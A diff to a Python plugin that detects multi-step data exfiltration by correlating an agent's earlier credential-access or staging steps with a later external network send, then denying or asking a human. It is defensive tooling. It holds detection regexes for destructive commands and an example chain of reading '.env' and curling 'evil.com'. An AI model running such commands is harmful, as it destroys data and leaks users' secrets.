@@ -5,15 +5,19 @@ base64 it (Defense Evasion), POST it out (Exfiltration). Each step alone may onl
 the SEQUENCE is the attack. Holmes' contribution over per-call signatures is to correlate them along
 the ATT&CK kill chain and fire on the correlated scenario, not the individual event.
 
-This plugin keeps a per-session, ordered list of the ATT&CK TACTICS reached (coarse detectors — the
-precise technique signatures are mitre_guard's job). Its ONE firing rule, taken straight from the
-data-exfiltration methodology (mindpointgroup.com/blog/conducting-and-detecting-data-exfiltration):
-a chain is only real once sensitive data was actually ACCESSED (credential-access / collection) — mere
-recon or cleanup is NOT a chain. Given real data access, a step that then SENDS to an external
-destination is exfiltration → DENY; a fuller multi-stage progression into another terminal tactic
-(destroy / C2 / persistence) → DENY. Everything else stays silent. This is deliberately conservative:
-without a prior data-access stage AND a terminal action, the plugin never fires, so an ordinary run of
-varied commands (ls, cat notes, git status, a couple of curls to trusted hosts) is never a "kill chain".
+This plugin is deliberately SCOPED to one thing: slow-poisoning data EXFILTRATION, and it is checked
+ONLY at a NETWORK SEND. That is the design: `observe()` quietly records, on EVERY step, whether that
+step touched sensitive data (credential-access / collection) — but the whole-session look-back that
+decides "is this a chain?" runs ONLY when the CURRENT command is an external network send (curl/scp/
+POST/…). A send is the one moment data can actually leave, so it's the only moment worth correlating
+the history. On any non-network command this plugin does nothing at all — no history scan — and the
+per-step plugins (destructive, mitre, pii, provenance, …) handle those exactly as usual.
+
+The firing rule, from the data-exfiltration methodology (mindpointgroup.com/blog/conducting-and-
+detecting-data-exfiltration): at a network send to an EXTERNAL destination, look back — if sensitive
+data was ACCESSED earlier this session, the send completes an exfiltration chain → DENY. If nothing
+sensitive was accessed, or the destination is trusted, it's an ordinary request → silent. So `cat .env`
+then `curl evil.com` is stopped; `ls; cat notes; curl github.com` is not.
 """
 
 from __future__ import annotations
@@ -42,10 +46,12 @@ _TACTIC = [
     ("impact", re.compile(r"rm\s+-[a-z]*[rf]|mkfs\.|dd\s+.*of=/dev/|\bshred\b|:\(\)\s*\{|encrypt|ransom|"
                           r"drop\s+database|truncate\s+table|vssadmin\s+delete", re.I)),
 ]
-# A chain needs proof that sensitive data was actually TOUCHED (accessed or staged), not just recon.
-_DATA_ACCESS = {"credential_access", "collection"}   # read a secret / staged data to send
-_WEAK = {"discovery", "defense_evasion"}             # recon or cleanup — supporting only, never enough alone
-_TERMINAL = {"exfiltration", "impact", "command_and_control", "persistence"}
+# When a network send fires, we look back over the WHOLE history at FULL VIGOUR — all precursor tactics,
+# not just the strongest — so a staged poison (recon → collect → encode → send) is caught, not only the
+# obvious secret→send. Credential-access is the strongest signal (a secret leaving is unambiguous exfil);
+# the rest corroborate a progression.
+_CRED = {"credential_access"}                        # read a secret/key — a send after this IS exfil
+_PRECURSOR = {"credential_access", "collection", "discovery", "defense_evasion"}  # any staging/recon step
 
 
 def _stages(tool: str, text: str, external_egress: bool) -> set[str]:
@@ -91,28 +97,26 @@ class KillChain(Plugin):
 
     def pre_check(self, tool: str, args: dict, ctx: PluginContext) -> PreVerdict | None:
         text = flatten(args)
-        cur = _stages(tool, text, self._external_egress(tool, text))
-        term = cur & _TERMINAL
-        if not term:
-            return None                     # not a terminal action → no chain to complete yet
-        # `_load` holds only stages from EARLIER steps (observe runs after this pre_check), so it is
-        # exactly the prior history — don't subtract the current step, or a terminal that also happens
-        # to name a secret (e.g. `curl -d @.env …`) would erase the real earlier access that precedes it.
-        history = self._load(ctx)
-        data_prior = [s for s in history if s in _DATA_ACCESS]
-        weak_prior = [s for s in history if s in _WEAK]
-        # THE gate: no earlier step actually accessed sensitive data → this is not a chain. This is
-        # what stops a run of varied commands (recon, cleanup, a destructive step) from reading as an
-        # attack. Exfiltration in particular requires that data was accessed AND is now being sent out.
-        if not data_prior:
+        # SCOPE GATE: the slow-exfil look-back runs ONLY at an external network send — the one moment
+        # data can actually leave. Not a network send (or a send to a trusted host) → do nothing at all;
+        # we don't even read the history. Every non-network command is left entirely to the per-step
+        # plugins. This is the whole point: "when a curl happens, only then look at the history."
+        if not self._external_egress(tool, text):
             return None
-        chain = " → ".join(data_prior + weak_prior + sorted(term))
-        if "exfiltration" in term:
+        # It IS an external send — now check the WHOLE history at FULL VIGOUR. `_load` holds only stages
+        # from EARLIER steps (observe runs after this pre_check), so it is exactly the prior history.
+        history = self._load(ctx)
+        priors = [s for s in dict.fromkeys(history) if s in _PRECURSOR]
+        if not priors:
+            return None                       # a clean send — nothing suspicious preceded it
+        chain = " → ".join(priors) + " → exfiltration"
+        # A secret was read, OR a fuller staged progression (≥2 precursors) precedes the send → this is
+        # exfiltration. DENY.
+        if any(s in _CRED for s in priors) or len(priors) >= 2:
             return PreVerdict("deny", f"completes a data-exfiltration sequence · {chain} — sensitive data "
-                              f"was accessed earlier and this step sends it to an external destination",
-                              self.name, tactic="exfiltration")
-        # A non-exfil terminal (destroy / C2 / persistence) is a chain only with a fuller progression.
-        if len(data_prior) + len(weak_prior) >= 2:
-            return PreVerdict("deny", f"is part of a multi-stage attack · {chain} — steps that are "
-                              f"innocuous alone but together complete an attack", self.name)
-        return None
+                              f"was staged earlier this session and this network command sends it to an "
+                              f"external destination", self.name, tactic="exfiltration")
+        # A single softer precursor (e.g. one collection/recon step) before an external send is suspicious
+        # but not conclusive → ASK a human to confirm.
+        return PreVerdict("ask", f"looks like a staged exfiltration · {chain} — a data-staging step "
+                          f"preceded this external send; confirm it's intended", self.name, tactic="exfiltration")
